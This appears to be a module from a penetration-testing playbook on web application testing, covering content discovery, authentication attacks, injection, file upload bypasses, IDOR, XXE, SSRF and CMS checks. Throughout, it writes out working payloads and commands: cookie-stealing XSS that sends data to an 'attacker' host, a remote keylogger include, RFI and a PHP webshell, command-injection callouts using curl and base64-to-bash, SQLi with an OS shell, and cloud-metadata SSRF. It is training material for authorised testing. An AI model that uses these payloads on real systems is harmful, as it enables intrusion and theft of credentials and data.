# Module 04: Web Application Testing

## When to Use This Module
Use this module whenever you discover a web service (ports 80, 443, 8080, 8443, or any non-standard port serving HTTP). Web applications are the single most common initial access vector. This module covers the full pipeline: recon → content discovery → authentication testing → injection attacks → file-based attacks.

## Prerequisites
- Target web server IP + port identified (from Module 02)
- Web proxy configured (Burp Suite or ZAP)
- Ffuf/SecLists installed for content discovery
- Browser configured to use proxy

## Entry Check

```
Web server discovered (port 80/443/8080/8443)?
├── Yes → Begin with passive recon
│   ├── Browsing to page? What's displayed?
│   │   ├── Default page → Check for hidden content, CMS
│   │   ├── Login page → Test auth attack paths
│   │   ├── Full application → Map functionality
│   │   └── Redirect → Note target, follow redirect
│   │
│   ├── What technology is running?
│   │   ├── Check HTTP headers (Server, X-Powered-By)
│   │   ├── Check page source for comments, hidden fields
│   │   ├── Use WhatWeb/Wappalyzer for fingerprinting
│   │   └── Check for known CMS (WordPress, Drupal, Joomla)
│   │
│   └── Dynamic vs static content?
│       ├── Dynamic (PHP, ASP, JSP, etc.) → Full test suite below
│       └── Static (HTML only) → Limited attack surface, check for misconfigs
│
└── No web server → Return to Module 02 enumeration
```

## Phase 1: Web Proxy Setup

### Burp Suite
```bash
# Start Burp
burpsuite

# Key tabs:
# Proxy > Intercept → Toggle interception (off = passive browsing)
# Proxy > HTTP History → Review all requests
# Target > Site Map → Application map
# Repeater (Ctrl+R) → Modify and resend requests
# Intruder (Ctrl+I) → Automated fuzzing/brute force
# Decoder → Encode/decode payloads
# Comparer → Diff two responses (blind SQLi detection)

# Install CA cert in browser: browse to http://burp → download
# Firefox: Preferences → Certificates → Import
```

### ZAP
```bash
# Start ZAP
zaproxy
# Pre-configured browser: click Firefox icon in toolbar
```

### Burp Workflow Patterns

```
Burp workflow decision:
├── Find hidden params → Intruder with param wordlist
│   └── Compare response length to baseline → outlier = hidden param
├── Bypass filter → Repeater, modify payload variants
│   └── Use Comparer → which variant slipped through
├── Session handling → Project options → Session Handling Rules
│   └── Macro: record login flow for auto-reauth
├── Match-and-replace → Auto-add auth headers
├── Search across site → Target > Site map > Search
│   └── Search: "password", "api_key", "TODO", "secret"
└── Logger++ → Full traffic log with search/filter
```

## Phase 2: Content Discovery

```
Directory/endpoint known?
├── Yes → Review page for functionality
├── No → Fuzz for content
│   ├── Directories → ffuf directory wordlist
│   ├── Files → ffuf with extensions (.php, .asp, .txt, .bak)
│   ├── Parameters → ffuf parameter fuzzing
│   ├── Subdomains → ffuf vhost fuzzing (if applicable)
│   └── API endpoints → ffuf with API wordlists
└── Found nothing → Try larger wordlist, different extensions
```

### Ffuf Commands

```bash
# Directory fuzzing
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt:FUZZ \
     -u http://target/FUZZ -ic

# File extension fuzzing
ffuf -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ \
     -u http://target/indexFUZZ -ic

# Recursive directory fuzzing
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt:FUZZ \
     -u http://target/FUZZ -recursion -recursion-depth 2 -ic

# Parameter fuzzing (GET)
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
     -u http://target/page.php?FUZZ=test -fs <baseline_size>

# POST parameter fuzzing
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
     -u http://target/page.php -X POST -d 'FUZZ=test' -fs <baseline_size>

# VHost fuzzing (look for different Content-Length)
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ \
     -u http://target -H "Host: FUZZ.target.com" -fs <baseline_size>

# Value fuzzing (parameter values)
ffuf -w wordlist.txt:FUZZ \
     -u http://target/page.php?param=FUZZ
```

### Nmap NSE for Web

```bash
# HTTP enumeration scripts
nmap --script http-enum -p 80,443 <target>
nmap --script http-title -p 80,443 <target>
nmap --script http-headers -p 80,443 <target>
nmap --script http-webdav-scan -p 80,443 <target>
```

## Phase 3: Authentication Testing

```
Login page discovered?
├── Test default credentials (admin:admin, admin:password)
├── Test for username enumeration (valid vs invalid user messages)
├── Check for password reset functionality
├── Check for registration page
├── Check for "Remember Me" functionality
└── XSS in login fields → steal session/admin creds
```

### Login Brute Forcing

```
Password policy known?
├── Yes → Spray within lockout threshold
│   ├── Lockout after N attempts → Use N-1 attempts per user
│   └── Lockout duration known → Wait between spray cycles
├── Unknown → Start conservatively
│   ├── 1-2 passwords, many users
│   └── Monitor for lockout, extend wait if detected
└── No lockout → Full brute force
```

### Hydra for Form Auth

```bash
hydra -L users.txt -P passwords.txt <target> http-post-form \
      "/login:username=^USER^&password=^PASS^:Invalid" -t 64
```

### Common Default Credentials

Always try: `admin:admin`, `admin:password`, `root:root`, `admin:123456`, `administrator:administrator`, `guest:guest`

## Phase 4: Injection Attacks

### SQL Injection (SQLi)

```
Input reflects data from database?
├── Test with: ', ", ;, --, /*, ), ', #, ' OR '1'='1
├── Observe response for errors or changed behavior
│   ├── Error message → May reveal DB type, query structure
│   ├── Boolean difference → Blind SQLi
│   ├── Time delay → Time-based blind SQLi
│   └── No difference → Not injectable, move on
└── In-band (error/union):
    ├── Determine number of columns: ORDER BY 1--
    ├── Determine output columns: UNION SELECT 1,2,3--
    └── Extract data: UNION SELECT 1,user(),database(),version(),4--
```

**SQLi detection decision tree:**
```
SQLi suspected?
├── Error-based → Extract info from error messages
├── UNION → Combine results with legitimate query
├── Boolean-blind → True/false responses infer data
├── Time-blind → SLEEP/WAITFOR delay infers data
├── Stacked queries → Multiple statements (high impact)
└── No injection found → Try encoded/alternate syntax
```

### SQLMap

```bash
# Basic usage
sqlmap -u 'http://target/page.php?id=1' --batch

# With cookie auth
sqlmap -u 'http://target/page.php?id=1' --cookie='PHPSESSID=xxx' --batch

# POST request from file
sqlmap -r request.txt --batch

# Database enumeration
sqlmap -u 'http://target/page.php?id=1' --dbms=mysql --dbs
sqlmap -u 'http://target/page.php?id=1' -D database --tables
sqlmap -u 'http://target/page.php?id=1' -D database -T users --dump

# OS shell (if DB has FILE privilege)
sqlmap -u 'http://target/page.php?id=1' --os-shell

# Tamper scripts for WAF bypass
sqlmap -u 'http://target/page.php?id=1' --tamper=space2comment --batch
```

### NoSQL Injection (MongoDB)

```
API/JSON endpoint using MongoDB?
├── Test auth bypass operators:
│   ├── {"username":{"$ne":null},"password":{"$ne":null}}
│   ├── {"username":"admin","password":{"$gt":""}}
│   └── {"$where":"this.password.match(/^a/)"}
├── PHP-Mongo: ?username[$ne]=&password[$ne]=
└── Time-based: {"$where":"sleep(5000)"}
```

### Cross-Site Scripting (XSS)

```
User input reflected on page?
├── Yes → Which type?
│   ├── Stored (persistent) → Saved in DB, shown to all users
│   │   └── CRITICAL: affects every visitor
│   ├── Reflected → Shown immediately (search, error)
│   │   └── Requires user interaction (phishing link)
│   └── DOM-based → Client-side only, never hits server
│       └── Harder to detect, check JS source
└── No XSS found → Try encoded/alternate syntax
```

**XSS test payloads:**
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
"><script>alert(1)</script>
'><script>alert(1)</script>
```

**XSS exploitation:**
```
Found XSS?
├── Steal cookies: <script>fetch('http://attacker/?c='+document.cookie)</script>
├── Keylogging: <script src=http://attacker/keylogger.js></script>
├── Phishing: Inject fake login form
├── CSRF: Execute state-changing actions as victim
└── Session hijack: Use stolen cookies to impersonate user
```

### File Inclusion (LFI/RFI)

```
Page uses include/require with user parameter?
├── Test: ../../../etc/passwd
├── Test encoded: ..%252f..%252f..%252fetc/passwd
├── Test PHP filter: php://filter/convert.base64-encode/resource=index.php
├── LFI confirmed →
│   ├── Can read files via path traversal
│   │   ├── /etc/passwd, /etc/shadow (if readable)
│   │   ├── /var/log/apache2/access.log (log poisoning)
│   │   ├── /proc/self/environ
│   │   └── Web app config files
│   └── Can write to filesystem via upload? → Log poisoning RCE
│       └── Inject PHP in User-Agent → include /var/log/apache2/access.log
├── RFI possible? → include http://attacker.com/shell.txt
└── No inclusion → Move to next attack
```

**PHP wrapper techniques:**
```bash
# Read source code
php://filter/convert.base64-encode/resource=config.php

# Execute command via input
php://input (POST body as PHP code)

# Data URI execution
data://text/plain;base64,<base64_encoded_php_code>

# Log poisoning (requires write access to logs)
# Inject in User-Agent: <?php system($_GET['cmd']); ?>
# Then: page=/var/log/apache2/access.log&cmd=id
```

### Command Injection (CMDi)

```
Application executes system commands based on user input?
├── Test injection characters: ; | || & && ` $() $( )
├── Test blind injection: ; sleep 5
├── Test OOB: ; curl http://attacker/exfil
├── Injection confirmed →
│   ├── Basic: ; id
│   ├── Blind (time): ; sleep 5
│   ├── Blind (OOB): ; nslookup attacker.com
│   └── Filtered? → Try encoding, alternate syntax
│       ├── ${IFS} instead of space
│       ├── $() instead of backticks
│       └── Base64 encode: echo base64_encoded | base64 -d | bash
└── No injection → Move to next attack
```

## Phase 5: File Upload Attacks

```
File upload functionality found?
├── What restrictions exist?
│   ├── Client-side only (JS check) → Disable JS or intercept with proxy
│   ├── Content-Type validation → Change to image/jpeg
│   ├── Extension blacklist → Alternate extensions
│   ├── Extension whitelist → Double extensions, null byte, race
│   └── File content validation → Magic bytes, polyglot files
├── No restrictions → Arbitrary file upload
│   └── Upload webshell → RCE
└── Bypass techniques:
    ├── Extension: .php5, .phtml, .pht, .shtml, .php.jpg
    ├── Content-Type: image/jpeg, image/png
    ├── Double ext: shell.php.jpg
    ├── Null byte: shell.php%00.jpg (PHP < 5.3)
    ├── Magic bytes: GIF89a prepended to shell
    ├── Race condition: Upload and access simultaneously
    └── Character injection: %20, %0a, %00, ., / before extension
```

## Phase 6: Web Attacks (IDOR, XXE, SSRF, etc.)

### Insecure Direct Object References (IDOR)

```
Object reference exposed in URL/API?
├── Test sequential: uid=1 → uid=2, file=1 → file=2
├── Test encoded: base64 decode → modify → re-encode
├── Test hashed: Check if hash computed client-side
├── Test API: GET/PUT/DELETE other users' endpoints
├── Mass enumeration: Loop IDs to dump all data
└── Success → Access unauthorized data, privilege escalation
```

### XML External Entity (XXE) Injection

```
Application accepts XML input?
├── Test file read:
│   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
├── Test SSRF:
│   <!ENTITY xxe SYSTEM "http://internal-host:8080/">
├── Test blind OOB:
│   <!ENTITY xxe SYSTEM "http://attacker/xxe">
├── Success → File disclosure, SSRF, potential RCE
└── No → Move to next attack
```

### Server-Side Request Forgery (SSRF)

```
Application fetches remote resources based on user input?
├── Test: ?url=http://127.0.0.1, ?url=http://localhost
├── Test: http://169.254.169.254 (cloud metadata)
├── Bypass techniques:
│   ├── Decimal: http://2130706433 (127.0.0.1)
│   ├── DNS rebinding: custom domain → 127.0.0.1
│   └── Redirect: attacker.com → 302 to internal
├── Cloud metadata: http://169.254.169.254/latest/meta-data/
├── Internal port scan: http://127.0.0.1:PORT
└── Success → Internal network access, cloud creds
```

### HTTP Verb Tampering

```
Authentication bypass via method?
├── Test: HEAD instead of GET (may bypass auth)
├── Test: PUT/DELETE (may bypass filters)
├── Test: OPTIONS (check allowed methods)
├── Test: PATCH (partial bypass)
├── Header bypass: X-Forwarded-For: 127.0.0.1
├── Header bypass: X-Original-URL: /admin
└── Header bypass: X-Rewrite-URL: /admin
```

### Mass Assignment

```
Form/API accepts extra parameters?
├── Add extra fields: admin=true, role=admin
├── Add: is_admin=1, verified=true, permission_level=999
├── Add: group_id=0, balance=99999
└── Success → Privilege escalation
```

### Deserialization Attacks

```
Binary/encoded data in request?
├── Java → rO0AB (base64), ViewState, RMI
├── PHP → O:<n>:"ClassName":, phar:// wrapper
├── Python → pickle (gASV...), base64 starting with "gA"
├── .NET → AAEAAAD/////, ViewState
├── Ruby → Marshal, YAML.load
└── Found? → Craft malicious serialized object → RCE
```

### Open Redirect

```
Redirect parameter in URL?
├── Direct: ?next=https://attacker.com
├── Protocol: //attacker.com
├── @-trick: https://target.com@attacker.com
├── Whitelist bypass: attacker.com.target.com
└── Success → Phishing, credential harvesting
```

## Phase 7: CMS & Common Application Testing

```
CMS detected?
├── WordPress → wpscan, plugin enum, XML-RPC, theme RCE
├── Joomla → joomscan, default creds, template RCE
├── Drupal → droopescan, Drupalgeddon2/3, PHP Filter
├── Tomcat → /manager/html, WAR upload, Ghostcat (CVE-2020-1938)
├── Jenkins → Script Console RCE
├── Splunk → Custom app deployment, debug RCE
├── GitLab → Public repos, API, auth RCE
├── phpMyAdmin → SELECT INTO OUTFILE → webshell
└── Unknown → Wappalyzer + searchsploit + manual
```

## Cross-References
- For shells after RCE → [Module 05: Initial Access](../modules/05-initial-access.md)
- For password cracking found creds → [Module 06: Password Attacks](../modules/06-password-attacks.md)
- For database servers on non-web ports → [Module 07: Common Services](../modules/07-common-services.md)
- For service-level attacks → [Module 08: Common Applications](../modules/08-common-apps.md)
- Web proxy cheat sheet → [assets/cheatsheets/web-proxy.md](../assets/cheatsheets/web-proxy.md)
- Ffuf usage → [assets/cheatsheets/ffuf.md](../assets/cheatsheets/ffuf.md)

## Output Summary
- [ ] Web application fingerprinted (tech stack, framework)
- [ ] Content discovery completed (directories, files, params)
- [ ] Authentication mechanisms tested (default creds, brute force)
- [ ] SQL injection tested (error, boolean, time-based)
- [ ] XSS tested (stored, reflected, DOM)
- [ ] LFI/RFI tested with wrappers
- [ ] Command injection tested
- [ ] File upload tested with bypasses
- [ ] IDOR, XXE, SSRF, verb tampering tested
- [ ] CMS/application-specific checks performed
- [ ] All findings documented with requests/responses
